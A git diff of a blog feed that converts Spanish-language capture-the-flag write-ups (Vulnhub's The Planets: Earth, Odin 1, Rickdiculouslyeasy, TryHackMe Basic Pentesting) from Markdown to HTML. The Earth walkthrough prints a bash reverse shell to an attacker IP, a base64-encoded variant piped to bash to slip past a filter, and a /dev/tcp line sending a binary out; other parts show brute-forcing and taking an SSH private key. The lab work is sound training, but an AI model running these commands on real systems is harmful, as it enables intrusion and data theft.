+<p>FLAG:{TheyFoundMyBackDoorMorty}-10Points\n”)</p>
 
-FLAG{Yeah d- just don't do it.} - 10 Points
+<p>FLAG{Yeah d- just don’t do it.} - 10 Points</p>
 
-FLAG{Whoa this is unexpected} - 10 Points
+<p>FLAG{Whoa this is unexpected} - 10 Points</p>
 
-FLAG{Get off the high road Summer!} - 10 Points
+<p>FLAG{Get off the high road Summer!} - 10 Points</p>
 
-FLAG: {131333} - 20 Points
+<p>FLAG: {131333} - 20 Points</p>
 
-FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+<p>FLAG{And Awwwaaaaayyyy we Go!} - 20 Points</p>
 
-FLAG: {Ionic Defibrillator} - 30 points
+<p>FLAG: {Ionic Defibrillator} - 30 points</p>
 
-FLAG {There is no Zeus, in your face!} - 10 Points  
+<p>FLAG {There is no Zeus, in your face!} - 10 Points</p>
 
-Total 120/130]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Rickdiculouslyeasy: 1.]]></summary></entry><entry><title type="html">The Planets: Earth</title><link href="http://localhost:4000/vulnhub/the_planets_earth/" rel="alternate" type="text/html" title="The Planets: Earth" /><published>2022-08-09T00:00:00+02:00</published><updated>2022-08-09T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/the_planets_earth</id><content type="html" xml:base="http://localhost:4000/vulnhub/the_planets_earth/"><![CDATA[[https://www.vulnhub.com/entry/the-planets-earth,755/](https://www.vulnhub.com/entry/the-planets-earth,755/)
+<p>Total 120/130</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Rickdiculouslyeasy: 1.]]></summary></entry><entry><title type="html">The Planets: Earth</title><link href="http://localhost:4000/vulnhub/the_planets_earth/" rel="alternate" type="text/html" title="The Planets: Earth" /><published>2022-08-09T00:00:00+02:00</published><updated>2022-08-09T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/the_planets_earth</id><content type="html" xml:base="http://localhost:4000/vulnhub/the_planets_earth/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
 
-Realizar un escaneo nmap a la red para buscar el equipo
-```bash
-sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
-```
+<p>Realizar un escaneo nmap a la red para buscar el equipo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/1.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/1.png" alt="image-center" class="align-center" /></p>
 
-Saldrá una máquina con varios puertos abiertos
+<p>Saldrá una máquina con varios puertos abiertos</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/2.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/2.png" alt="image-center" class="align-center" /></p>
 
-Realizar un escaneo nmap profundo a la IP que aparece
-```bash
-sudo nmap -vvv -sS -sV -O  -p- --min-rate 5000 --script vuln -Pn 192.168.122.11 -oG allports
-```
+<p>Realizar un escaneo nmap profundo a la IP que aparece</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span>  <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--script</span> vuln <span class="nt">-Pn</span> 192.168.122.11 <span class="nt">-oG</span> allports
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/3.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/3.png" alt="image-center" class="align-center" /></p>
 
-Aparecerán los puertos `22,80,443` abiertos
+<p>Aparecerán los puertos <code class="language-plaintext highlighter-rouge">22,80,443</code> abiertos</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/4.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/4.png" alt="image-center" class="align-center" /></p>
 
-Aparecerán bastantes vulnerabilidades, entre ellas se mostrarán dos DNS que habra que poner en `/etc/hosts` apuntando a la IP de la máquina victima
+<p>Aparecerán bastantes vulnerabilidades, entre ellas se mostrarán dos DNS que habra que poner en <code class="language-plaintext highlighter-rouge">/etc/hosts</code> apuntando a la IP de la máquina victima</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/5.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/5.png" alt="image-center" class="align-center" /></p>
 
-Editar el archivo `/etc/hosts` para añadir las DNS
-```bash
-sudo nano /etc/hosts
-```
+<p>Editar el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para añadir las DNS</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/6.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/6.png" alt="image-center" class="align-center" /></p>
 
-Entrar a la web como `earth.local`
+<p>Entrar a la web como <code class="language-plaintext highlighter-rouge">earth.local</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/7.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/7.png" alt="image-center" class="align-center" /></p>
 
-Realizar un escaneo con gobuster a ambas DNS como https
-```bash
-sudo gobuster dir -u https://earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
-```
+<p>Realizar un escaneo con gobuster a ambas DNS como https</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://earth.local <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-k</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/8.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/8.png" alt="image-center" class="align-center" /></p>
 
-```bash
-sudo gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://terratest.earth.local <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-k</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/9.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/9.png" alt="image-center" class="align-center" /></p>
 
-Reportará que hay un `robots.txt`, acceder a él. Mostrará una lista de directorios.
+<p>Reportará que hay un <code class="language-plaintext highlighter-rouge">robots.txt</code>, acceder a él. Mostrará una lista de directorios.</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/10.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/10.png" alt="image-center" class="align-center" /></p>
 
-Ir a `/testingnotes.txt`
+<p>Ir a <code class="language-plaintext highlighter-rouge">/testingnotes.txt</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/11.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/11.png" alt="image-center" class="align-center" /></p>
 
-Ir a `testdata.txt`
+<p>Ir a <code class="language-plaintext highlighter-rouge">testdata.txt</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/12.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/12.png" alt="image-center" class="align-center" /></p>
 
-Usar cyberchef para desencriptar los mensajes de earth.local usando como clave el texto de `testdata.txt`
+<p>Usar cyberchef para desencriptar los mensajes de earth.local usando como clave el texto de <code class="language-plaintext highlighter-rouge">testdata.txt</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/13.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/13.png" alt="image-center" class="align-center" /></p>
 
-Mostrará un menaje repetido bastantes veces que es earthclimatechangebad4humans
-Usar ese resultado como contraseña en `earth.local/admin/login`
+<p>Mostrará un menaje repetido bastantes veces que es earthclimatechangebad4humans
+Usar ese resultado como contraseña en <code class="language-plaintext highlighter-rouge">earth.local/admin/login</code></p>
 
-```bash
-Usuario: terra
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usuario: terra
 Contraseña: earthclimatechangebad4humans
-```
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/14.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/14.png" alt="image-center" class="align-center" /></p>
 
-Al intentar hacer un reverse shell mostrará que no están permitidas las conexiones, esto es porque detecta que se está introduciendo un comando de reverse shell
-```bash
-/bin/bash -i >& /dev/tcp/192.168.122.13/4444 0>&1
-```
+<p>Al intentar hacer un reverse shell mostrará que no están permitidas las conexiones, esto es porque detecta que se está introduciendo un comando de reverse shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.122.13/4444 0&gt;&amp;1
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/15.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/15.png" alt="image-center" class="align-center" /></p>
 
-Encriptar el comando con base64
-```bash
-echo "/bin/bash -i >& /dev/tcp/192.168.122.13/4444 0>&1" | base64
-```
+<p>Encriptar el comando con base64</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.122.13/4444 0&gt;&amp;1"</span> | <span class="nb">base64</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/16.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/16.png" alt="image-center" class="align-center" /></p>
 
-Poner el puerto en escucha
-```bash
-nc -lvnp 4444
-```
+<p>Poner el puerto en escucha</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
 
-IMPORTANTE: Utilizo `ncwrap` que es un alias que he asignado al comando "`rlwrap nc`", para poder usar un shell inverso mejorado.
+<p>IMPORTANTE: Utilizo <code class="language-plaintext highlighter-rouge">ncwrap</code> que es un alias que he asignado al comando “<code class="language-plaintext highlighter-rouge">rlwrap nc</code>”, para poder usar un shell inverso mejorado.</p>
 
-Para poder usarlo instalar `rlwrap` con `sudo apt install -y rlwrap` y opcionalmente crear un alias que al escribirlo ejecute "`rlwrap nc`"
+<p>Para poder usarlo instalar <code class="language-plaintext highlighter-rouge">rlwrap</code> con <code class="language-plaintext highlighter-rouge">sudo apt install -y rlwrap</code> y opcionalmente crear un alias que al escribirlo ejecute “<code class="language-plaintext highlighter-rouge">rlwrap nc</code>”</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/17.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/17.png" alt="image-center" class="align-center" /></p>
 
-Mandar ese comando encriptado indicando que después se desencripte y ejecute
+<p>Mandar ese comando encriptado indicando que después se desencripte y ejecute</p>
 
-```bash
-echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTIyLjEzLzQ0NDQgMD4mMQo=' | base64 -d | bash
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTIyLjEzLzQ0NDQgMD4mMQo='</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/18.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/18.png" alt="image-center" class="align-center" /></p>
 
-Se abrirá un shell inverso
+<p>Se abrirá un shell inverso</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/19.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/19.png" alt="image-center" class="align-center" /></p>
 
-Al ir a `/var` se podrá ver un directorio llamado `earth_web`
-```bash
-cd /var
-ls –la
-```
+<p>Al ir a <code class="language-plaintext highlighter-rouge">/var</code> se podrá ver un directorio llamado <code class="language-plaintext highlighter-rouge">earth_web</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var
+<span class="nb">ls</span> –la
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/20.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/20.png" alt="image-center" class="align-center" /></p>
 
-Ir a `earth_web` y mostrar el contenido
-```bash
-cd earth_web
-ls -la
-```
+<p>Ir a <code class="language-plaintext highlighter-rouge">earth_web</code> y mostrar el contenido</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>earth_web
+<span class="nb">ls</span> <span class="nt">-la</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/21.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/21.png" alt="image-center" class="align-center" /></p>
 
-Leer el archivo `user_flag.txt`
-```bash
-cat user_flag.txt
-Flag: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
-```
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">user_flag.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user_flag.txt
+Flag: <span class="o">[</span>user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/22.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/22.png" alt="image-center" class="align-center" /></p>
 
-Buscar archivos en el sistema con permisos especiales para el usuario actual
-```bash
-find / -perm -u=s 2>/dev/null
-```
+<p>Buscar archivos en el sistema con permisos especiales para el usuario actual</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/23.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/23.png" alt="image-center" class="align-center" /></p>
 
-Saldrá un archivo llamado `reset_root`, al ejecutarlo mostrará un error
+<p>Saldrá un archivo llamado <code class="language-plaintext highlighter-rouge">reset_root</code>, al ejecutarlo mostrará un error</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/24.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/24.png" alt="image-center" class="align-center" /></p>
 
-Al intentar hacer un `cat` al archivo este será ilegible
+<p>Al intentar hacer un <code class="language-plaintext highlighter-rouge">cat</code> al archivo este será ilegible</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/25.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/25.png" alt="image-center" class="align-center" /></p>
 
-Por esto será necesario mandar el archivo al equipo atacante para poder revisarlo.
+<p>Por esto será necesario mandar el archivo al equipo atacante para poder revisarlo.</p>
 
-Primero se pondrá un puerto en escucha esperando por la información del archivo y que lo guardará en el equipo:
-```bash
-nc -nlvp 9002 > reset_root
-```
+<p>Primero se pondrá un puerto en escucha esperando por la información del archivo y que lo guardará en el equipo:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 9002 <span class="o">&gt;</span> reset_root
+</code></pre></div></div>
 
-Luego mandar el archivo:
-```bash
-cat /usr/bin/reset_root > /dev/tcp/192.168.122.13/9002
-```
+<p>Luego mandar el archivo:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/bin/reset_root <span class="o">&gt;</span> /dev/tcp/192.168.122.13/9002
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/26.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/26.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/27.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/27.png" alt="image-center" class="align-center" /></p>
 
-Se recibirá correctamente y el `nc` se cerrará
+<p>Se recibirá correctamente y el <code class="language-plaintext highlighter-rouge">nc</code> se cerrará</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/28.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/28.png" alt="image-center" class="align-center" /></p>
 
-Dar permisos de ejecución al archivo `reset_root`
+<p>Dar permisos de ejecución al archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/29.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/29.png" alt="image-center" class="align-center" /></p>
 
-Asegurar que se tiene instalado `strace`, si no instalarlo
-```bash
-sudo apt install –y strace
-```
+<p>Asegurar que se tiene instalado <code class="language-plaintext highlighter-rouge">strace</code>, si no instalarlo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install</span> –y strace
+</code></pre></div></div>
 
-Comprobar el contenido del archivo `reset_root`
-```bash
-strace -f ./reset_root
-```
+<p>Comprobar el contenido del archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace <span class="nt">-f</span> ./reset_root
+</code></pre></div></div>
 
-Entre todo el contenido mostrará unas líneas que comprueban si existen unos archivos, de existir entonces el script cambia la contraseña del usuario root.
+<p>Entre todo el contenido mostrará unas líneas que comprueban si existen unos archivos, de existir entonces el script cambia la contraseña del usuario root.</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/30.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/30.png" alt="image-center" class="align-center" /></p>
 
-Crear los archivos en el equipo víctima
-```bash
-touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
-```
+<p>Crear los archivos en el equipo víctima</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/31.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/31.png" alt="image-center" class="align-center" /></p>
 
-Ejecutar de nuevo el archivo `reset_root`
-```bash
-/usr/bin/reset_root
-```
+<p>Ejecutar de nuevo el archivo <code class="language-plaintext highlighter-rouge">reset_root</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/reset_root
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/32.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/32.png" alt="image-center" class="align-center" /></p>
 
-Ahora habrá cambiado la contraseña de `root` a `Earth`
+<p>Ahora habrá cambiado la contraseña de <code class="language-plaintext highlighter-rouge">root</code> a <code class="language-plaintext highlighter-rouge">Earth</code></p>
 
-Cambiar al usuario `root` con la contraseña `Earth`
-```bash
-su
-```
+<p>Cambiar al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña <code class="language-plaintext highlighter-rouge">Earth</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/33.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/33.png" alt="image-center" class="align-center" /></p>
 
-Comprobar que el usuario es root
-```bash
-whoami
-```
+<p>Comprobar que el usuario es root</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/34.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/34.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio de root y mostrar el contenido
-```bash
-cd /root
-ls –la
-```
+<p>Ir al directorio de root y mostrar el contenido</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
+<span class="nb">ls</span> –la
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/35.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/35.png" alt="image-center" class="align-center" /></p>
 
-Leer el archivo `root_flag.txt`
-```bash
-cat root_flag.txt
-```
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">root_flag.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>root_flag.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/36.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/earth/36.png" alt="image-center" class="align-center" /></p>
 
-## Flags
+<h2 id="flags">Flags</h2>
 
-Usuario: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
+<p>Usuario: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</p>
 
-Root: [root_flag_b0da9554d29db2117b02aa8b66ec492e]]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de The Planets: Earth.]]></summary></entry><entry><title type="html">Odin 1</title><link href="http://localhost:4000/vulnhub/odin1/" rel="alternate" type="text/html" title="Odin 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/odin1</id><content type="html" xml:base="http://localhost:4000/vulnhub/odin1/"><![CDATA[[https://www.vulnhub.com/entry/odin-1,619//](https://www.vulnhub.com/entry/odin-1,619/)
+<p>Root: [root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de The Planets: Earth.]]></summary></entry><entry><title type="html">Basic Pentesting</title><link href="http://localhost:4000/tryhackme/basic-pentesting/" rel="alternate" type="text/html" title="Basic Pentesting" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/tryhackme/basic-pentesting</id><content type="html" xml:base="http://localhost:4000/tryhackme/basic-pentesting/"><![CDATA[<h1 id="preguntas">Preguntas</h1>
 
+<p><strong>What does the acronym VM stand for?</strong></p>
 
-```bash
-sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
-```
+<p>virtual machine</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/1.png){: .align-center}
+<p><strong>What is the name of the hidden directory on the web server(enter name without /)?</strong></p>
 
-Aparecerá una máquina con el puerto 80 abierto
+<p>Development</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/2.png){: .align-center}
+<p><strong>What is the username?</strong></p>
 
-Aparecerá una máquina con el puerto 80 abierto
+<p>Jan</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/3.png){: .align-center}
+<p><strong>What is the password?</strong></p>
 
-Editar el archivo `/etc/host` y añadir la ip de la máquina con su respectivo DNS
+<p>armando</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/4.png){: .align-center}
+<p><strong>What service do you use to access the server(answer in abbreviation in all caps)?</strong></p>
 
-Hacer click en el primer artículo y pasarlo por dcode.fr
+<p>SSH</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/5.png){: .align-center}
+<p><strong>What is the name of the other user you found(all lower case)?</strong></p>
 
-Saldrá que está cifrado en Base32
+<p>Kay</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/6.png){: .align-center}
+<p><strong>What is the final password you obtain?</strong></p>
 
-Usar el descifrador de Base32, pondrá un enlace que lleva al repositorio de SecLists, específicamente al wordlist de rockyou
+<p>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/7.png){: .align-center}
+<h1 id="proceso">Proceso</h1>
 
-Realizar el mismo proceso con el siguiente texto
+<p>Listar todos los directorios ocultos de la web</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/8.png){: .align-center}
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.35.80 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> html,php,txt
+</code></pre></div></div>
 
-Saldrá que es Base64, descifrarlo
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/1.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/9.png){: .align-center}
+<p>Listar los usuarios del sistema</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/10.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/2.png" alt="image-center" class="align-center" /></p>
 
-Y por último con el comentario del artículo
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/3.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/11.png){: .align-center}
+<p>Listar los recursos compartidos por SMB</p>
 
-Saldrá que es brainfuck
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/4.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/12.png){: .align-center}
+<p>Entrar al recurso compartido de Anonymous y mostrar el contenido</p>
 
-No mostrará nada relevante
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/5.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/13.png){: .align-center}
+<p>Usar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar la contraseña de jay</p>
 
-Ir al login de la web y probar un usuario
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/6.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/14.png){: .align-center}
+<p>Entrar por ssh con el usuario jay y la contraseña descubierta</p>
 
-Mostrará que el usuario no existe
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/7.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/15.png){: .align-center}
+<p>Ir al directorio home, luego al directorio personal de kay y al directorio <code class="language-plaintext highlighter-rouge">.ssh</code>, dentro se encontrará la clave privada del usuario</p>
 
-Probar con admin, mostrará que el usuario existe pero la contraseña es incorrecta
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/8.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/16.png){: .align-center}
+<p>Leer el archivo de la clave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> y copiar el contenido</p>
 
-Usar wpcan para encontrar la contraseña del usuario admin utilizando el wordlist de rockyou
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/9.png" alt="image-center" class="align-center" /></p>
 
-```bash
-sudo wpscan --192.168.122.6 --usernames admin -P /usr/share/wordlists/rockyou.txt
-```
